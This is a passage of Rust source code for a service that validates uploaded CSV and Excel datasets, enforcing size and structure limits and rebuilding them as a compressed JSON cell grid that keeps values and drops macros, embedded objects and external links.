//! Lab datasets (use case `lab-dataset`): a delimited text table or an Excel workbook (.xlsx), checked for structure
//! and rebuilt as a cell grid that keeps the values and nothing that runs. The service only decodes text to recognize
//! it; the bounded worker parses (`worker dataset-grid`), and the service reads its report and the grid it wrote.
//!
//! The grid, `enrichedlab.cell-grid.v1`, is gzip-compressed JSON lines. The first line describes the source and its
//! sheets. Then each sheet, in order, is a line `{"sheet": n}` followed by one line per row from the sheet's first
//! row, so the k-th row line is the row a spreadsheet program numbers k: an array of cells with trailing empty cells
//! left out (an empty row is `[]`), and a sheet's trailing empty rows left out. A cell is `null` (empty), a string, a
//! number, `true` or `false`, or an object where JSON has no plain form: `{"date": "2025-03-04"}`, `{"datetime":
//! "2025-03-04T10:30:00"}`, `{"time": "10:30:00"}`, `{"seconds": 5400}` for a duration, `{"error": "#DIV/0!"}`, or
//! `{"serial": -3}` for a date-formatted number outside Excel's calendar. A date or duration a workbook stores as ISO
//! 8601 text is `{"datetime": text}` or `{"duration": text}`, as written. Whole numbers below 2^53 are integers.
//!
//! A delimited text's cells are its fields as written, decoded to UTF-8; an empty field is `""`. A workbook's cells
//! are the values it held when it was last saved: formulas are never run, and a formula saved without a value is
//! `null`. Each sheet's description lists its merged ranges as `[first_row, first_column, last_row, last_column]`,
//! zero-based and inclusive, indexing the row lines and their cells.
use crate::detect::FileType;
use crate::pdf::{self, Tools, WorkerError};
use crate::rules::{Rules, Scope, Severity};
use crate::text::{self, UnicodeCounts};
use anyhow::{Context, Result, anyhow};
use calamine::{DataRef, Reader, SheetType, SheetVisible, Xlsx};
use flate2::{Compression, write::GzEncoder};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::ffi::OsStr;
use std::io::{Cursor, Read, Write};
use std::path::Path;

pub const GRID_SCHEMA: &str = "enrichedlab.cell-grid.v1";
/// The media type of a rebuilt dataset: the grid above.
pub const GRID_MEDIA_TYPE: &str = "application/vnd.enrichedlab.cell-grid+gzip";

/// What a dataset may hold. Past any bound the file is refused as too large (`table_too_large`), never cut.
#[derive(Clone, Copy, Debug)]
pub struct Limits {
    pub sheets: usize,
    /// Rows and columns, as Excel counts them.
    pub rows: u32,
    pub columns: u32,
    /// Cells that hold something, in all sheets.
    pub cells: u64,
    /// Characters in one cell, Excel's own limit.
    pub cell_chars: usize,
    /// The grid's text before compression.
    pub grid_bytes: usize,
    /// A workbook package's parts, each part's size once decompressed, and their total, measured by decompressing
    /// them rather than taken from the package's own directory.
    pub parts: usize,
    pub part_bytes: u64,
    pub package_bytes: u64,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            sheets: 64,
            rows: 1_048_576,
            columns: 16_384,
            cells: 4_000_000,
            cell_chars: 32_767,
            grid_bytes: 256 * 1024 * 1024,
            parts: 10_000,
            part_bytes: 256 * 1024 * 1024,
            package_bytes: 1024 * 1024 * 1024,
        }
    }
}

/// Merged ranges listed per sheet; the count is always given.
const MAX_MERGED: usize = 10_000;
/// Delimiters tried on a text table, in order of preference on a tie, and the records each is tried on.
const DELIMITERS: [u8; 4] = [b',', b'\t', b';', b'|'];
const SNIFF_RECORDS: usize = 200;
/// A double holds every whole number below this exactly.
const EXACT: f64 = 9_007_199_254_740_992.0;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Source {
    Delimited,
    Xlsx,
}

impl Source {
    pub fn of(kind: FileType) -> Option<Self> {
        match kind {
            FileType::Delimited => Some(Self::Delimited),
            FileType::Xlsx => Some(Self::Xlsx),
            _ => None,
        }
    }

    pub fn arg(self) -> &'static str {
        match self {
            Self::Delimited => "delimited",
            Self::Xlsx => "xlsx",
        }
    }

    pub fn from_arg(value: &str) -> Option<Self> {
        match value {
            "delimited" => Some(Self::Delimited),
            "xlsx" => Some(Self::Xlsx),
            _ => None,
        }
    }
}

/// Parts of a workbook that run, embed or reach out; counts only.
#[derive(Clone, Debug, Default, PartialEq, Eq, Deserialize, Serialize)]
pub struct Structure {
    /// VBA projects and Excel 4.0 macro sheet parts; one for a main part declared macro-enabled without either.
    pub macros: u64,
    /// Embedded objects and files.
    pub embedded: u64,
    /// ActiveX and form controls.
    pub controls: u64,
    /// Links to other workbooks, data connections and query tables.
    pub external: u64,
    /// XML parts that declare a document type or entities, which no workbook needs.
    pub declarations: u64,
}

/// One sheet of the grid; counts only, never its name.
#[derive(Clone, Debug, Default, PartialEq, Eq, Deserialize, Serialize)]
pub struct SheetReport {
    pub rows: u32,
    pub columns: u32,
    pub cells: u64,
    pub hidden: bool,
    pub formulas: u64,
    pub formulas_without_values: u64,
    pub merged: u64,
}

/// A rule that matched the grid's text.
#[derive(Clone, Debug, PartialEq, Eq, Deserialize, Serialize)]
pub struct GridMatch {
    pub rule: String,
    pub severity: Severity,
}

/// The worker's report on one dataset, which the service turns into findings. It names no content.
#[derive(Clone, Debug, Default, PartialEq, Eq, Deserialize, Serialize)]
pub struct Report {
    pub rules_version: String,
    /// A ZIP archive with no workbook in it: an archive, not a table.
    pub archive_without_workbook: bool,
    pub encoding: Option<String>,
    pub delimiter: Option<String>,
    pub sheets: Vec<SheetReport>,
    pub structure: Structure,
    pub unicode: UnicodeCounts,
    /// The bound the dataset passed, in words; then there is no grid.
    pub too_large: Option<String>,
    pub matches: Vec<GridMatch>,
    pub grid_bytes: u64,
    pub copy_bytes: u64,
}

/// The bytes are not a readable table of the type they are checked as.
#[derive(Debug)]
pub struct Unreadable;

#[derive(Debug)]
pub struct Rebuilt {
    pub report: Report,
    /// The compressed grid; none when a bound was passed or the archive held no workbook.
    pub copy: Option<Vec<u8>>,
}

/// The type to check `bytes` as in a use case that allows `allowed`. A ZIP archive is checked as a workbook when
/// workbooks are allowed (the worker says when it holds none), and text that is no other type is a delimited table
/// when those are allowed. A text table cannot carry an archive: every archive signature has a control byte, which
/// text refuses.
pub fn refine(detected: FileType, bytes: &[u8], allowed: &[FileType]) -> FileType {
    match detected {
        FileType::Zip if allowed.contains(&FileType::Xlsx) => FileType::Xlsx,
        FileType::Unknown if allowed.contains(&FileType::Delimited) && decode(bytes).is_ok() => {
            FileType::Delimited
        }
        other => other,
    }
}

/// Runs the worker on one dataset in `work`: its report, and the grid it wrote when it wrote one, at most `max_copy`
/// bytes.
pub async fn check(
    tools: &Tools,
    bytes: &[u8],
    source: Source,
    work: &Path,
    max_copy: u64,
) -> Result<Result<Rebuilt, Unreadable>> {
    let input = work.join("dataset");
    let output = work.join("grid.ndjson.gz");
    tokio::fs::write(&input, bytes).await?;
    let args = [
        OsStr::new("--type"),
        OsStr::new(source.arg()),
        OsStr::new("--input"),
        input.as_os_str(),
        OsStr::new("--output"),
        output.as_os_str(),
        OsStr::new("--rules"),
        tools.rules_dir.as_os_str(),
    ];
    let report: Report = match pdf::worker(tools, "dataset-grid", &args).await {
        Ok(report) => report,
        Err(WorkerError::Unreadable) => return Ok(Err(Unreadable)),
        Err(e) => return Err(anyhow!("the dataset was not checked: {e}")),
    };
    let copy = if report.too_large.is_none() && !report.archive_without_workbook {
        Some(pdf::read_bounded(&output, max_copy).await?)
    } else {
        None
    };
    Ok(Ok(Rebuilt { report, copy }))
}

/// Checks `bytes` as `source` and rebuilds them as the grid, which may take at most `max_copy` bytes compressed.
pub fn rebuild(
    bytes: &[u8],
    source: Source,
    rules: &Rules,
    max_copy: u64,
    limits: Limits,
) -> Result<Result<Rebuilt, Unreadable>> {
    let mut grid = Grid::new(limits);
    let mut report = Report {
        rules_version: rules.version.clone(),
        ..Report::default()
    };
    let done = |report: Report| Ok(Ok(Rebuilt { report, copy: None }));
    let sheets = match source {
        Source::Delimited => {
            let Ok(text) = decode(bytes) else {
                return Ok(Err(Unreadable));
            };
            let delimiter = sniff(&text.text, limits.columns as usize);
            report.encoding = Some(text.encoding.into());
            report.delimiter = Some(char::from(delimiter).to_string());
            match delimited(&text.text, delimiter, &mut grid) {
                Ok(sheet) => {
                    let described = describe(Value::Null, &sheet, Vec::new());
                    report.sheets.push(sheet);
                    vec![described]
                }
                Err(Stop::Unreadable) => return Ok(Err(Unreadable)),
                Err(Stop::TooLarge) => Vec::new(),
            }
        }
        Source::Xlsx => {
            let package = match inspect_package(bytes, &limits) {
                Inspected::Package(package) => package,
                Inspected::NoWorkbook => {
                    report.archive_without_workbook = true;
                    return done(report);
                }
                Inspected::TooLarge(bound) => {
                    report.too_large = Some(bound.into());
                    return done(report);
                }
                Inspected::Unreadable => return Ok(Err(Unreadable)),
            };
            report.structure = package.structure;
            if report.structure.macros == 0 && package.macro_enabled {
                report.structure.macros = 1;
            }
            match workbook(bytes, &mut grid, &mut report) {
                Ok(sheets) => sheets,
                Err(Stop::Unreadable) => return Ok(Err(Unreadable)),
                Err(Stop::TooLarge) => Vec::new(),
            }
        }
    };
    report.unicode = grid.unicode;
    if let Some(bound) = grid.too_large {
        report.too_large = Some(bound.into());
        return done(report);
    }
    let first = serde_json::to_vec(&json!({"schema": GRID_SCHEMA, "source": {
        "type": source.arg(), "sha256": hex::encode(Sha256::digest(bytes)), "bytes": bytes.len(),
        "encoding": report.encoding, "delimiter": report.delimiter, "sheets": sheets}}))?;
    // The first line, with the sheets' names and merged ranges, is part of the grid and of its room.
    if first.len() + 1 + grid.text.len() > limits.grid_bytes {
        report.too_large = Some(ROOM.into());
        return done(report);
    }
    // Cell text is checked as the file's own bytes are: the rules that look for programs, commands and hidden text.
    for found in rules.scan(&grid.text, Scope::file(source.arg()))? {
        report.matches.push(GridMatch {
            rule: found.rule,
            severity: found.severity,
        });
    }
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&first)?;
    encoder.write_all(b"\n")?;
    encoder.write_all(&grid.text)?;
    let copy = encoder.finish().context("grid not compressed")?;
    report.grid_bytes = (first.len() + 1 + grid.text.len()) as u64;
    report.copy_bytes = copy.len() as u64;
    if report.copy_bytes > max_copy {
        report.too_large = Some("the rebuilt table is larger than the guard keeps".into());
        return done(report);
    }
    Ok(Ok(Rebuilt {
        report,
        copy: Some(copy),
    }))
}

fn describe(name: Value, sheet: &SheetReport, merged: Vec<Value>) -> Value {
    json!({"name": name, "rows": sheet.rows, "columns": sheet.columns, "hidden": sheet.hidden,
        "formulas": sheet.formulas, "formulas_without_values": sheet.formulas_without_values,
        "merged_count": sheet.merged, "merged": merged})
}

/// Why a sheet stopped: its bytes could not be read as a table, or a bound was passed (recorded in the grid).
enum Stop {
    Unreadable,
    TooLarge,
}

/// The grid's text as it is written, bounded, with the counts every cell adds to.
struct Grid {
    limits: Limits,
    text: Vec<u8>,
    /// The bytes of text in the row being built, counted against the grid's room before the row is written.
    row_text: usize,
    cells: u64,
    unicode: UnicodeCounts,
    too_large: Option<&'static str>,
}

impl Grid {
    fn new(limits: Limits) -> Self {
        Grid {
            limits,
            text: Vec::new(),
            row_text: 0,
            cells: 0,
            unicode: UnicodeCounts::default(),
            too_large: None,
        }
    }

    fn stop(&mut self, bound: &'static str) -> Stop {
        self.too_large.get_or_insert(bound);
        Stop::TooLarge
    }

    /// One line of the grid, written only as far as the grid's room, its line end included.
    fn line(&mut self, value: &Value) -> Result<(), Stop> {
        self.row_text = 0;
        let limit = self.limits.grid_bytes.saturating_sub(1);
        if serde_json::to_writer(
            Bounded {
                text: &mut self.text,
                limit,
            },
            value,
        )
        .is_err()
        {
            return Err(self.stop(ROOM));
        }
        self.text.push(b'\n');
        Ok(())
    }

    /// A text value: its invisible characters counted, and refused past Excel's cell length. A row is built before it
    /// is written, so its texts are counted against the grid's room first: a row repeating one long shared text across
    /// its columns is refused before it is held.
    fn text(&mut self, value: &str) -> Result<Value, Stop> {
        if value.chars().count() > self.limits.cell_chars {
            return Err(self.stop("a cell holds more text than a spreadsheet cell can"));
        }
        self.row_text += value.len();
        if self.text.len() + self.row_text > self.limits.grid_bytes {
            return Err(self.stop(ROOM));
        }
        self.unicode.add(text::count(value));
        Ok(Value::String(value.to_owned()))
    }

    /// Counts a cell that holds something.
    fn filled(&mut self) -> Result<(), Stop> {
        self.cells += 1;
        if self.cells > self.limits.cells {
            return Err(self.stop("the table has more filled cells than this upload accepts"));
        }
        Ok(())
    }
}

/// Why a grid stopped at its room.
const ROOM: &str = "the table's values take more room than this upload accepts";

/// The grid's text, refusing a write that would take it past `limit`.
struct Bounded<'a> {
    text: &'a mut Vec<u8>,
    limit: usize,
}

impl Write for Bounded<'_> {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        if self.text.len() + bytes.len() > self.limit {
            return Err(std::io::Error::other("the grid's room is used"));
        }
        self.text.extend_from_slice(bytes);
        Ok(bytes.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

/// One sheet's rows as they are read. Empty rows wait until a row with something in it follows, so a sheet's
/// trailing empty rows are never written.
struct Rows {
    written: u32,
    waiting: u32,
    columns: u32,
}

impl Rows {
    fn new() -> Self {
        Rows {
            written: 0,
            waiting: 0,
            columns: 0,
        }
    }

    /// The index of the next row.
    fn next(&self) -> u32 {
        self.written + self.waiting
    }

    /// Empty rows up to the row at `index`.
    fn skip_to(&mut self, index: u32) {
        self.waiting += index.saturating_sub(self.next());
    }

    fn push(&mut self, grid: &mut Grid, mut row: Vec<Value>) -> Result<(), Stop> {
        while row.last() == Some(&Value::Null) {
            row.pop();
        }
        if row.is_empty() {
            self.waiting += 1;
            return Ok(());
        }
        if self.next() >= grid.limits.rows {
            return Err(grid.stop("the table has more rows than a spreadsheet can"));
        }
        for _ in 0..self.waiting {
            grid.line(&json!([]))?;
        }
        self.written += self.waiting + 1;
        self.waiting = 0;
        self.columns = self.columns.max(row.len() as u32);
        grid.line(&Value::Array(row))
    }
}

struct Decoded {
    text: String,
    encoding: &'static str,
}

/// Text as UTF-8: UTF-8 with or without its mark, UTF-16 after its mark, otherwise Windows-1252, as spreadsheet
/// programs on Windows write it. Text with control characters other than tab and line ends is not a table.
fn decode(bytes: &[u8]) -> Result<Decoded, Unreadable> {
    let (text, encoding) = if let Some(rest) = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]) {
        (
            std::str::from_utf8(rest)
                .map_err(|_| Unreadable)?
                .to_owned(),
            "utf-8",
        )
    } else if bytes.starts_with(&[0xFF, 0xFE]) || bytes.starts_with(&[0xFE, 0xFF]) {
        let (encoding, name) = if bytes[0] == 0xFF {
            (encoding_rs::UTF_16LE, "utf-16le")
        } else {
            (encoding_rs::UTF_16BE, "utf-16be")
        };
        let (text, malformed) = encoding.decode_with_bom_removal(bytes);
        if malformed {
            return Err(Unreadable);
        }
        (text.into_owned(), name)
    } else if let Ok(text) = std::str::from_utf8(bytes) {
        (text.to_owned(), "utf-8")
    } else {
        let (text, _) = encoding_rs::WINDOWS_1252.decode_without_bom_handling(bytes);
        (text.into_owned(), "windows-1252")
    };
    if text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\t' | '\n' | '\r'))
    {
        return Err(Unreadable);
    }
    Ok(Decoded { text, encoding })
}

/// A record that is not a table row.
enum Broken {
    /// A quoted field with no closing quote before the end of the text.
    Unterminated,
    /// More fields than the limit.
    TooWide,
}

/// The records of a delimited text, read as spreadsheet programs read them. A field that starts with a double quote
/// may hold the delimiter, line breaks and doubled quotes, and text after its closing quote joins it; a quote anywhere
/// else is text. A line feed, a carriage return or both end a record outside quotes, and an empty line is a record
/// with no fields. Every delimiter and break is one ASCII byte, which a UTF-8 sequence never contains, so the bytes
/// are scanned and the text is sliced only at those bytes.
struct Records<'a> {
    text: &'a str,
    at: usize,
    delimiter: u8,
    max_fields: usize,
}

impl<'a> Records<'a> {
    fn new(text: &'a str, delimiter: u8, max_fields: usize) -> Self {
        Records {
            text,
            at: 0,
            delimiter,
            max_fields,
        }
    }
}

impl Iterator for Records<'_> {
    type Item = Result<Vec<String>, Broken>;

    fn next(&mut self) -> Option<Self::Item> {
        let text = self.text;
        let bytes = text.as_bytes();
        if self.at >= bytes.len() {
            return None;
        }
        let mut fields: Vec<String> = Vec::new();
        let mut field = String::new();
        let mut i = self.at;
        let mut quoted = false;
        let mut field_start = true;
        let mut empty = true;
        while i < bytes.len() {
            let b = bytes[i];
            if quoted {
                if b == b'"' {
                    if bytes.get(i + 1) == Some(&b'"') {
                        field.push('"');
                        i += 2;
                    } else {
                        quoted = false;
                        i += 1;
                    }
                } else {
                    let end = bytes[i..]
                        .iter()
                        .position(|&c| c == b'"')
                        .map_or(bytes.len(), |n| i + n);
                    field.push_str(&text[i..end]);
                    i = end;
                }
                continue;
            }
            if b == b'\n' || b == b'\r' {
                self.at = if b == b'\r' && bytes.get(i + 1) == Some(&b'\n') {
                    i + 2
                } else {
                    i + 1
                };
                if !empty {
                    fields.push(field);
                }
                return Some(Ok(fields));
            }
            empty = false;
            if b == self.delimiter {
                fields.push(std::mem::take(&mut field));
                if fields.len() >= self.max_fields {
                    self.at = bytes.len();
                    return Some(Err(Broken::TooWide));
                }
                field_start = true;
                i += 1;
            } else if b == b'"' && field_start {
                quoted = true;
                field_start = false;
                i += 1;
            } else {
                let end = bytes[i..]
                    .iter()
                    .position(|&c| c == self.delimiter || c == b'\n' || c == b'\r')
                    .map_or(bytes.len(), |n| i + n);
                field.push_str(&text[i..end]);
                field_start = false;
                i = end;
            }
        }
        self.at = bytes.len();
        if quoted {
            return Some(Err(Broken::Unterminated));
        }
        fields.push(field);
        Some(Ok(fields))
    }
}

/// The delimiter whose first records most often share one field count above one; a comma when none does. Empty
/// lines are not counted.
fn sniff(text: &str, max_fields: usize) -> u8 {
    let mut best = (0_usize, 0_usize, b',');
    for delimiter in DELIMITERS {
        let counts: Vec<usize> = Records::new(text, delimiter, max_fields)
            .map_while(Result::ok)
            .filter(|record| !record.is_empty())
            .take(SNIFF_RECORDS)
            .map(|record| record.len())
            .collect();
        let Some(modal) = mode(&counts) else {
            continue;
        };
        if modal < 2 {
            continue;
        }
        let agreeing = counts.iter().filter(|&&n| n == modal).count();
        if (agreeing, modal) > (best.0, best.1) {
            best = (agreeing, modal, delimiter);
        }
    }
    best.2
}

/// The most frequent value, the smaller on a tie.
fn mode(values: &[usize]) -> Option<usize> {
    let mut seen = std::collections::BTreeMap::new();
    for value in values {
        *seen.entry(*value).or_insert(0_usize) += 1;
    }
    seen.into_iter()
        .max_by(|a, b| a.1.cmp(&b.1).then(b.0.cmp(&a.0)))
        .map(|(value, _)| value)
}

/// A text table's records as rows: an empty line is an empty row, as a spreadsheet program shows it.
fn delimited(text: &str, delimiter: u8, grid: &mut Grid) -> Result<SheetReport, Stop> {
    grid.line(&json!({"sheet": 0}))?;
    let mut rows = Rows::new();
    for record in Records::new(text, delimiter, grid.limits.columns as usize) {
        let record = match record {
            Ok(record) => record,
            Err(Broken::Unterminated) => return Err(Stop::Unreadable),
            Err(Broken::TooWide) => {
                return Err(grid.stop("a row has more columns than a spreadsheet can"));
            }
        };
        let mut row = Vec::with_capacity(record.len());
        for field in &record {
            if !field.is_empty() {
                grid.filled()?;
            }
            row.push(grid.text(field)?);
        }
        rows.push(grid, row)?;
    }
    Ok(SheetReport {
        rows: rows.written,
        columns: rows.columns,
        cells: grid.cells,
        ..SheetReport::default()
    })
}

/// What the package's parts show before the workbook is read.
struct Package {
    structure: Structure,
    macro_enabled: bool,
}

/// Finds a document type or entity declaration in a part read in pieces, also one split between two pieces.
#[derive(Default)]
struct Declarations {
    tail: Vec<u8>,
    found: bool,
}

impl Declarations {
    const MARKERS: [&'static [u8]; 2] = [b"<!DOCTYPE", b"<!ENTITY"];

    fn feed(&mut self, piece: &[u8]) {
        if self.found {
            return;
        }
        self.tail.extend_from_slice(piece);
        self.found = Self::MARKERS.iter().any(|m| contains(&self.tail, m));
        // Keep one byte less than the longest marker: enough to finish a marker the next piece completes.
        let keep_from = self.tail.len().saturating_sub(Self::MARKERS[0].len() - 1);
        self.tail.drain(..keep_from);
    }
}

enum Inspected {
    Package(Package),
    NoWorkbook,
    TooLarge(&'static str),
    Unreadable,
}

/// The workbook package's parts, each decompressed and measured: within bounds, a spreadsheet's main part, and what
/// in it runs, embeds or reaches out. A part that holds more than the package claims for it is unreadable, found at
/// the first read past its claim.
fn inspect_package(bytes: &[u8], limits: &Limits) -> Inspected {
    if !directory_within(bytes, limits.parts) {
        return Inspected::TooLarge(PARTS);
    }
    let Ok(mut archive) = ::zip::ZipArchive::new(Cursor::new(bytes)) else {
        return Inspected::Unreadable;
    };
    if archive.len() > limits.parts {
        return Inspected::TooLarge(PARTS);
    }
    let mut package = Package {
        structure: Structure::default(),
        macro_enabled: false,
    };
    let mut total = 0_u64;
    let mut types = None;
    let mut chunk = vec![0_u8; 64 * 1024];
    for index in 0..archive.len() {
        let Ok(mut part) = archive.by_index(index) else {
            return Inspected::Unreadable;
        };
        let name = part.name().to_ascii_lowercase();
        // As the workbook reader names it: the shared texts of the workbook, wherever its main part is.
        let shared_texts = name.replace('\\', "/").ends_with("sharedstrings.xml");
        let claimed = part.size();
        let structure = &mut package.structure;
        if name.ends_with("vbaproject.bin")
            || name.starts_with("xl/macrosheets/") && is_part_xml(&name)
        {
            structure.macros += 1;
        } else if name.starts_with("xl/embeddings/") {
            structure.embedded += 1;
        } else if (name.starts_with("xl/activex/") || name.starts_with("xl/ctrlprops/"))
            && is_part_xml(&name)
        {
            structure.controls += 1;
        } else if (name.starts_with("xl/externallinks/") || name.starts_with("xl/querytables/"))
            && is_part_xml(&name)
            || name == "xl/connections.xml"
        {
            structure.external += 1;
        }
        let xml = name.ends_with(".xml") || name.ends_with(".rels") || name.ends_with(".vml");
        let keep = name == "[content_types].xml";
        let mut kept = Vec::new();
        let mut size = 0_u64;
        let mut declarations = Declarations::default();
        loop {
            let read = match part.read(&mut chunk) {
                Ok(0) => break,
                Ok(n) => n,
                Err(_) => return Inspected::Unreadable,
            };
            size += read as u64;
            if size > claimed {
                return Inspected::Unreadable;
            }
            if size > limits.part_bytes || total + size > limits.package_bytes {
                return Inspected::TooLarge(
                    "the workbook decompresses to more than this upload accepts",
                );
            }
            if xml {
                declarations.feed(&chunk[..read]);
            }
            if keep && kept.len() < 4 * 1024 * 1024 {
                kept.extend_from_slice(&chunk[..read]);
            }
        }
        if size != claimed {
            return Inspected::Unreadable;
        }
        drop(part);
        if shared_texts {
            match shared_texts_within(&mut archive, index, limits.cells) {
                Some(true) => {}
                Some(false) => return Inspected::TooLarge(TEXTS),
                None => return Inspected::Unreadable,
            }
        }
        total += size;
        if declarations.found {
            package.structure.declarations += 1;
        }
        if keep {
            types = Some(kept);
        }
    }
    let Some(types) = types else {
        return Inspected::NoWorkbook;
    };
    let types = String::from_utf8_lossy(&types).to_ascii_lowercase();
    if types.contains("ms-excel.sheet.macroenabled.main+xml")
        || types.contains("ms-excel.template.macroenabled.main+xml")
    {
        package.macro_enabled = true;
    } else if !types.contains("spreadsheetml.sheet.main+xml")
        && !types.contains("spreadsheetml.template.main+xml")
    {
        return Inspected::NoWorkbook;
    }
    Inspected::Package(package)
}

const PARTS: &str = "the workbook has more parts than this upload accepts";
const TEXTS: &str = "the workbook lists more different texts than this upload accepts";

/// The ZIP reader sizes its directory from an end record's entry count before it reads an entry. The end record it
/// reads first, the last one in the file whose comment ends within it, and the ZIP64 records that one points to, must
/// name at most `parts` entries. Should the reader go on to an earlier record, its own checks hold that record to
/// 65,535 entries, or to one entry for each 46 bytes before a ZIP64 record, and the helper's address-space limit holds
/// the rest.
fn directory_within(bytes: &[u8], parts: usize) -> bool {
    const END: &[u8] = b"PK\x05\x06";
    const LOCATOR: &[u8] = b"PK\x06\x07";
    const END64: &[u8] = b"PK\x06\x06";
    let u16_at = |at: usize| u16::from_le_bytes([bytes[at], bytes[at + 1]]);
    let u64_at = |at: usize| {
        bytes
            .get(at..at + 8)
            .map(|b| u64::from_le_bytes(b.try_into().unwrap_or_default()))
    };
    let Some(end) = (0..bytes.len().saturating_sub(21)).rev().find(|&at| {
        &bytes[at..at + 4] == END && at + 22 + usize::from(u16_at(at + 20)) <= bytes.len()
    }) else {
        return true;
    };
    // The entries on this disk, which the reader takes, and in all.
    let entries = u16_at(end + 8).max(u16_at(end + 10));
    let located = end >= 20 && &bytes[end - 20..end - 16] == LOCATOR;
    if !(located && entries == u16::MAX) && usize::from(entries) > parts {
        return false;
    }
    if located {
        // The reader looks for the ZIP64 record from the offset the locator names up to the locator.
        let locator = end - 20;
        let from = u64_at(locator + 8)
            .and_then(|offset| usize::try_from(offset).ok())
            .unwrap_or(locator)
            .min(locator);
        let named = |at: usize| u64_at(at).is_none_or(|n| n > parts as u64);
        for at in (from..locator).filter(|&at| bytes[at..].starts_with(END64)) {
            if named(at + 24) || named(at + 32) {
                return false;
            }
        }
    }
    true
}

/// The workbook reader reserves room for as many texts as the first `sst` element of the shared-texts part says it
/// lists, before it reads one. The element is found as that reader finds it, with the same XML reader and settings,
/// and every number written among its attributes must be at most `cells`. Some(false) past it, none for a part that is
/// not there to read again; a part the XML reader cannot read is left to the workbook reader, which refuses it the
/// same way.
fn shared_texts_within<R: Read + std::io::Seek>(
    archive: &mut ::zip::ZipArchive<R>,
    index: usize,
    cells: u64,
) -> Option<bool> {
    use quick_xml::events::Event;
    let part = archive.by_index(index).ok()?;
    let mut xml = quick_xml::Reader::from_reader(std::io::BufReader::new(part));
    let config = xml.config_mut();
    config.check_end_names = false;
    config.trim_text(false);
    config.check_comments = false;
    config.expand_empty_elements = true;
    let mut buf = Vec::with_capacity(1024);
    loop {
        buf.clear();
        match xml.read_event_into(&mut buf) {
            Ok(Event::Start(e)) if e.local_name().as_ref() == b"sst" => {
                return Some(
                    e.attributes_raw()
                        .split(|b| !b.is_ascii_digit())
                        .filter(|digits| !digits.is_empty())
                        .all(|digits| {
                            std::str::from_utf8(digits)
                                .ok()
                                .and_then(|n| n.parse::<u64>().ok())
                                .is_some_and(|n| n <= cells)
                        }),
                );
            }
            Ok(Event::Eof) | Err(_) => return Some(true),
            _ => {}
        }
    }
}

/// A part's own XML, not its relationships.
fn is_part_xml(name: &str) -> bool {
    name.ends_with(".xml") && !name.contains("/_rels/")
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// Every worksheet's cells as rows, in the stored order; returns the sheets' descriptions for the grid's first line.
/// Chart and dialog sheets hold no cells. The reader refuses a workbook that lists a macro sheet, which is then
/// unreadable and held.
fn workbook(bytes: &[u8], grid: &mut Grid, report: &mut Report) -> Result<Vec<Value>, Stop> {
    let mut book: Xlsx<_> = Xlsx::new(Cursor::new(bytes)).map_err(|_| Stop::Unreadable)?;
    let sheets = book.sheets_metadata().to_vec();
    let mut described = Vec::new();
    for sheet in sheets {
        if sheet.typ != SheetType::WorkSheet {
            continue;
        }
        if described.len() == grid.limits.sheets {
            return Err(grid.stop("the workbook has more sheets than this upload accepts"));
        }
        grid.line(&json!({"sheet": described.len()}))?;
        let before = grid.cells;
        let mut counts = SheetReport {
            hidden: sheet.visible != SheetVisible::Visible,
            ..SheetReport::default()
        };
        let mut rows = Rows::new();
        {
            let mut reader = book
                .worksheet_cells_reader(&sheet.name)
                .map_err(|_| Stop::Unreadable)?;
            let mut open: Option<u32> = None;
            let mut row: Vec<Value> = Vec::new();
            while let Some(cell) = reader
                .next_cell_with_formula_metadata()
                .map_err(|_| Stop::Unreadable)?
            {
                let (at_row, at_column) = cell.pos;
                if at_row >= grid.limits.rows || at_column >= grid.limits.columns {
                    return Err(grid.stop("a cell lies past a spreadsheet's last row or column"));
                }
                match open {
                    // A cell before or on one already read: the sheet is out of order.
                    Some(r) if r == at_row && (at_column as usize) < row.len() => {
                        return Err(Stop::Unreadable);
                    }
                    Some(r) if r > at_row => return Err(Stop::Unreadable),
                    Some(r) if r == at_row => {}
                    _ => {
                        if open.is_some() {
                            rows.push(grid, std::mem::take(&mut row))?;
                        }
                        rows.skip_to(at_row);
                        open = Some(at_row);
                    }
                }
                let value = cell_value(&cell.value, grid)?;
                if cell.formula.is_some() {
                    counts.formulas += 1;
                    if value.is_null() {
                        counts.formulas_without_values += 1;
                    }
                }
                row.resize(at_column as usize, Value::Null);
                row.push(value);
            }
            if open.is_some() {
                rows.push(grid, row)?;
            }
        }
        let merged = book
            .merge_cells_by_sheet_name(&sheet.name)
            .map_err(|_| Stop::Unreadable)?;
        counts.rows = rows.written;
        counts.columns = rows.columns;
        counts.cells = grid.cells - before;
        counts.merged = merged.len() as u64;
        let listed = merged
            .iter()
            .take(MAX_MERGED)
            .map(|d| json!([d.start.0, d.start.1, d.end.0, d.end.1]))
            .collect();
        let name = grid.text(&sheet.name)?;
        described.push(describe(name, &counts, listed));
        report.sheets.push(counts);
    }
    Ok(described)
}

/// A number as JSON: whole numbers below 2^53 as integers.
fn number(value: f64) -> Value {
    if value.fract() == 0.0 && value.abs() < EXACT {
        json!(value as i64)
    } else {
        serde_json::Number::from_f64(value)
            .map(Value::Number)
            .unwrap_or_else(|| json!({"error": "#NUM!"}))
    }
}

/// One stored value as a grid cell.
fn cell_value(value: &DataRef<'_>, grid: &mut Grid) -> Result<Value, Stop> {
    let cell = match value {
        DataRef::Empty => return Ok(Value::Null),
        DataRef::Int(n) => json!(n),
        DataRef::Float(f) => number(*f),
        DataRef::String(s) => grid.text(s)?,
        DataRef::SharedString(s) => grid.text(s)?,
        DataRef::Bool(b) => json!(b),
        DataRef::DateTime(at) => {
            let serial = at.as_f64();
            if at.is_duration() {
                json!({"seconds": number((serial * 86_400_000.0).round() / 1000.0)})
            } else if !(0.0..2_958_466.0).contains(&serial) {
                json!({"serial": number(serial)})
            } else {
                let (year, month, day, hour, minute, second, milli) = at.to_ymd_hms_milli();
                let time = if milli > 0 {
                    format!("{hour:02}:{minute:02}:{second:02}.{milli:03}")
                } else {
                    format!("{hour:02}:{minute:02}:{second:02}")
